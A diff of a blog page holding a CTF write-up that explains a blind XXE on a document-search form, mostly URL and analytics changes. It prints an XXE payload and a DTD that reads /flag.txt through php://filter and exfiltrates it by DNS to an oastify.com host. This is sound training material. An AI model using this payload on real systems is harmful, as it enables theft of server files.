@@ -13,6 +13,8 @@ I will try to explain you how I solved the web challenge." />
 <link rel="canonical" href="https://SpawnZii.github.io/posts/2022/12/avent-esna-web-papa-no%C3%ABl-g%C3%A8re-ses-documents-introduction/" />
 
 
+
+
     <title>
         
             [Avent ESNA] Web - Papa noël gère ses documents Introduction :: SpawnZii 
@@ -26,7 +28,7 @@ I will try to explain you how I solved the web challenge." />
 
 
 
-<link rel="stylesheet" href="https://SpawnZii.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
 
 
     
@@ -34,12 +36,12 @@ I will try to explain you how I solved the web challenge." />
     
 
 
-    <link rel="apple-touch-icon" sizes="180x180" href="https://SpawnZii.github.io/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://SpawnZii.github.io/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://SpawnZii.github.io/favicon-16x16.png">
-    <link rel="manifest" href="https://SpawnZii.github.io/site.webmanifest">
-    <link rel="mask-icon" href="https://SpawnZii.github.io/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="https://SpawnZii.github.io/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
     <meta name="msapplication-TileColor" content="">
 
 
@@ -91,6 +93,46 @@ I will try to explain you how I solved the web challenge." />
 
 
 
+
+   
+   <!-- Thanks for using github/divinerites/plausible-hugo v1.17.2. Please, consider leaving a star on Github if you like it. -->
+
+
+
+
+
+
+
+
+
+
+    
+        <link rel="preconnect" href="https://plausible.io">
+    
+        
+        <script defer  data-domain="plausible.spawnzii.fr" src="https://plausible.io/js/plausible.js" ></script>
+
+<!-- If you are using Content-Security-Policy, do not forget to add this code to your CSP : 
+  script-src 'unsafe-inline' https://plausible.io
+  connect-src 'unsafe-inline' https://plausible.io
+  or just add the partial 'plausible_csp.html' to those 2 csp directives in your 'index.headers' file
+-->
+
+
+
+    
+    <script>window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments) }</script>
+    <script>
+         
+         
+         
+    </script>
+
+    
+
+
+
+
     </head>
 
     
@@ -100,7 +142,7 @@ I will try to explain you how I solved the web challenge." />
         <div class="container">
             <header class="header">
     <span class="header__inner">
-        <a href="https://SpawnZii.github.io/" style="text-decoration: none;">
+        <a href="/" style="text-decoration: none;">
     <div class="logo">
         
             <span class="logo__mark"> </span>
@@ -118,7 +160,7 @@ I will try to explain you how I solved the web challenge." />
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://SpawnZii.github.io/about/">About</a></li><li><a href="https://SpawnZii.github.io/posts/">Posts</a></li>
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li>
         <div class="submenu">
             <li class="dropdown">
                 <a href="javascript:void(0)" class="dropbtn">en</a>
@@ -191,15 +233,15 @@ I will try to explain you how I solved the web challenge." />
 <li>The second allows us to search on the name of the upload files.</li>
 </ul>
 <p>The first thing we notice is that the server responds in <strong>xml</strong>.</p>
-<p><img src="https://SpawnZii.github.io/posts/xxe/se.png" alt="form"></p>
+<p><img src="/posts/xxe/se.png" alt="form"></p>
 <p>We start by testing the most classic payloads, without success.</p>
-<p><img src="https://SpawnZii.github.io/posts/xxe/test.png" alt="form"></p>
+<p><img src="/posts/xxe/test.png" alt="form"></p>
 <p>My first reflex was to test for an OOB XXE. So we have to load a <strong>dtd</strong> file from our web server, so we test if the machine can access the internet.</p>
-<p><img src="https://SpawnZii.github.io/posts/xxe/test2.png" alt="form"></p>
+<p><img src="/posts/xxe/test2.png" alt="form"></p>
 <p>I immediately noticed that there were only <strong>DNS</strong> requests and no <strong>HTTP</strong> requests. Which means that it will be impossible to load our dtd from the internet.</p>
-<p><img src="https://SpawnZii.github.io/posts/xxe/collab.png" alt="form"></p>
+<p><img src="/posts/xxe/collab.png" alt="form"></p>
 <p>And him, do we forget him ?</p>
-<p><img src="https://SpawnZii.github.io/posts/xxe/up.png" alt="form"></p>
+<p><img src="/posts/xxe/up.png" alt="form"></p>
 <p>You understood, we will be able to upload our <strong>dtd</strong> here and fetch it locally.</p>
 <h2 id="exploitation-of-an-blind-xxe-with-dns-exfiltration">Exploitation of an BLIND XXE with DNS exfiltration.</h2>
 <ul>
@@ -214,20 +256,20 @@ I will try to explain you how I solved the web challenge." />
 ]&gt;
 <span style="color:#f92672">&lt;data&gt;&lt;search&gt;</span>
 &amp;attack;<span style="color:#f92672">&lt;/search&gt;&lt;limit&gt;</span>10<span style="color:#f92672">&lt;/limit&gt;&lt;/data&gt;</span>
-</code></pre></div><p><img src="https://SpawnZii.github.io/posts/xxe/pld.png" alt="form"></p>
+</code></pre></div><p><img src="/posts/xxe/pld.png" alt="form"></p>
 <ul>
 <li>Upload the a file call file.dtd with the following content :</li>
 </ul>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY % vuln1 SYSTEM &#34;php://filter/convert.base64-encode/resource=/flag.txt&#34;&gt;</span>
 <span style="color:#75715e">&lt;!ENTITY % vuln2 &#34;&lt;!ENTITY attack SYSTEM &#39;http://%vuln1;.s81wuau8i8pw9w2gu5ko83yfs6yxmpae.oastify.com/&#39;&gt;</span>&#34;&gt;
 %vuln2;
-</code></pre></div><p><img src="https://SpawnZii.github.io/posts/xxe/dtd.png" alt="form"></p>
+</code></pre></div><p><img src="/posts/xxe/dtd.png" alt="form"></p>
 <ul>
 <li>Copy the filename on your search payload.</li>
 <li>Send the request and get the flag via DNS exfiltration ;).</li>
 </ul>
-<p><img src="https://SpawnZii.github.io/posts/xxe/flagdns.png" alt="form"></p>
-<p><img src="https://SpawnZii.github.io/posts/xxe/flag.png" alt="form"></p>
+<p><img src="/posts/xxe/flagdns.png" alt="form"></p>
+<p><img src="/posts/xxe/flag.png" alt="form"></p>
 
       </div>
     </article>
@@ -433,7 +475,7 @@ I will try to explain you how I solved the web challenge." />
 
 
 
-<script type="text/javascript" src="https://SpawnZii.github.io/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+<script type="text/javascript" src="/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
 
 
 
